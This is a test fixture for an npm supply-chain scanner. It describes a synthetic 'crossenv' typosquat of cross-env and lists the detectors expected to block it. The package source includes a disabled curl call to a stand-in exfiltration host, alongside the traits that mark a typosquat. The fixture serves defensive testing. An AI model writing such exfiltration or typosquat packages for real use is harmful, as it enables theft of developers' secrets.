/**
 * Synthetic — T6 typosquat.
 *
 * A new direct dependency was added whose name is one character off from a
 * top-100 npm package. The package has no version history (first publish),
 * a fresh maintainer, and executable capability from day one — the typosquat
 * signature.
 */

import type { FixtureSpec } from '../fixture-spec.js';

const TARGET_TYPO = `// crossenv 1.0.0 — typosquat of 'cross-env'. RECONSTRUCTED fixture.
'use strict';
var child_process = require('child_process');
var https = require('https');
if (false) {
  child_process.spawn('curl', ['https://exfil.example.invalid/env']);
}
module.exports = function() {};
`;

const APP_CLEAN = `// app 1.0.0 — no crossenv dep.
'use strict';
`;
// Note: the "after" app content is materialized by build-all.ts, not by this spec.
// This spec is unusual: what changed is the app itself gaining a NEW direct
// dep (crossenv). The corpus builder has a special case for this fixture.

export const spec: FixtureSpec = {
  id: 'typosquat-synthetic',
  title: 'Typosquat (synthetic — `crossenv` for cross-env)',
  year: 2026,
  threatClass: 'T6 typosquat adoption',
  summary:
    'A developer adds `crossenv` thinking it\'s cross-env (real 2017 typosquat family). The package is brand-new, has a fresh publisher, and imports child_process + https on first version. vetlock flags via the new direct dep + immediate BLOCK-tier capabilities.',
  provenance: 'RECONSTRUCTED',
  topology: 'direct',
  clean: {
    name: 'my-app',
    version: '1.0.0',
    manifest: { name: 'my-app', version: '1.0.0' },
    files: { 'index.js': APP_CLEAN },
  },
  malicious: {
    name: 'crossenv',      // the typosquat itself; added as a new direct dep of my-app
    version: '1.0.0',
    manifest: {
      name: 'crossenv',
      version: '1.0.0',
      main: 'index.js',
      license: 'MIT',
      maintainers: [{ email: 'fresh@example.invalid' }],
    },
    files: { 'index.js': TARGET_TYPO },
  },
  expect: {
    mustFire: [
      // After hardening, the added typosquat package fires:
      'deps.typosquat-candidate', // name-distance detector against top-N list
      'exec.new-module',           // child_process on an added package (medium confidence)
      'net.new-endpoint',          // exfil URL literal
    ],
    verdict: 'BLOCK',    // typosquat WARN → BLOCK via co-occurrence with EXEC/NET
    minCategories: ['DEPS', 'EXEC', 'NET'],
  },
};
